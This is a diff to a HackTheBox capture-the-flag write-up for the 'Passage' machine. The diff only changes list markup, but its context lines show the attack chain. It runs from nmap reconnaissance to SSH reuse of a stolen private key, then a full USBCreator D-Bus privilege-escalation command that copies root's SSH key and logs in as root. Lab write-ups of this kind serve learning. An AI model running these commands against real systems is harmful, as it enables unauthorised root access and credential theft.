@@ -8,7 +8,7 @@ title: HackTheBox Write-up &mdash; Passage
 This machine is currently active, and is my first attempt at HTB.  Its IP address is `10.10.10.206`.
 
 # The Short Version
-<ul>
+<ol>
 	<li>Run `nmap -sC -sV 10.10.10.206` to get the open ports;</li>
 	<li> Run `echo "10.10.10.206    passage" | sudo tee -a /etc/hosts` to get a nicer way to reference the machine;</li>
 	<li>Go to `http://passage:80` on your browser.  Notice it uses CuteNews;</li>
@@ -34,6 +34,7 @@ You could also parse the `/var/www/html/CuteNews/cdata/users/lines` file using `
 	<li>As Paul seems to have access to admin's (`nadav`'s) account via `ssh`, we can run `ssh -i ~/.ssh/id_rsa nadav@passage`; now we are pretending to be `nadav`;</li>
 	<li>Now we are admin, making use of a vulnerability in the USBCreator D-Bus interface that allows privilege escalation, we can gain root access to this machine by running `cd /tmp && gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true && ssh -i pwn root@passage`;</li>
 	<li>Capture the "flag": `cat /root/root.txt`.</li>
+</ol>
 
 # The Long (Verbatim) Version
 
